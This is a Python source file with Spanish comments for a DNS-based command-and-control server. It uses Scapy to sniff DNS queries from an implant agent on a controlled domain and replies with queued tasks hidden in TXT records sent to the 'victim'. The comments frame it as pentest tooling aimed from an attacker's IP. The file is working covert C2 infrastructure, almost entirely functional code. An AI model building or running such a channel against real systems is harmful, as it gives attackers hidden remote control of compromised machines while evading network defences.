# FICHERO: c2_dns_server.py
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sniff

# --- CONFIGURACIÓN DEL C2 ---
AGENT_ID = "synapse01"  # Identificador único para nuestro agente
DNS_SERVER_IP = "192.168.1.100" # TU PROPIA IP DE ATACANTE
DOMAIN = "c2.synapse.corp"      # El dominio que controlamos

# Base de datos de tareas simple (en un pentest real, sería más complejo)
task_queue = {
    AGENT_ID: '{"comando": "scan", "args": ["127.0.0.1", "80,443"]}'
}

print(f"[*] Iniciando servidor DNS C2 en {DNS_SERVER_IP} para el dominio '{DOMAIN}'...")
print(f"[*] Esperando check-ins del agente '{AGENT_ID}'...")

def handle_dns_request(packet):
    # Nos aseguramos de que es una petición DNS para nuestro dominio
    if DNS in packet and packet[DNS].opcode == 0 and packet[DNS].qr == 0 and DOMAIN in str(packet[DNSQR].qname):
        
        qname = packet[DNSQR].qname.decode('utf-8')
        print(f"\n[+] Check-in recibido de: {packet[IP].src}")
        print(f"    Consulta: {qname}")

        # El agente nos pide una tarea con una consulta tipo: <agent_id>.tasks.c2.synapse.corp
        if f"{AGENT_ID}.tasks" in qname:
            task = task_queue.get(AGENT_ID, "none") # "none" si no hay tareas
            
            print(f"    [*] Tarea encontrada: {task}")
            print(f"    [*] Enviando tarea como respuesta TXT...")

            # Construimos una respuesta DNS de tipo TXT que contiene la tarea
            dns_response = DNS(
                id=packet[DNS].id,
                qr=1, # Es una respuesta
                aa=1, # Somos autoritativos
                qd=packet[DNS].qd, # Copiamos la pregunta original
                an=DNSRR(rrname=qname, type='TXT', ttl=60, rdata=task)
            )
            
            # La enviamos de vuelta a la víctima
            response_packet = IP(dst=packet[IP].src) / UDP(dport=packet[UDP].sport, sport=53) / dns_response
            send(response_packet, verbose=0)
            
            # Una vez enviada, eliminamos la tarea para que no se repita
            if AGENT_ID in task_queue:
                del task_queue[AGENT_ID]
        else:
            print("    [!] Consulta no reconocida. Ignorando.")

# Iniciar el sniffer de Scapy para escuchar solo peticiones DNS en el puerto 53
sniff(filter=f"udp port 53 and ip dst {DNS_SERVER_IP}", prn=handle_dns_request)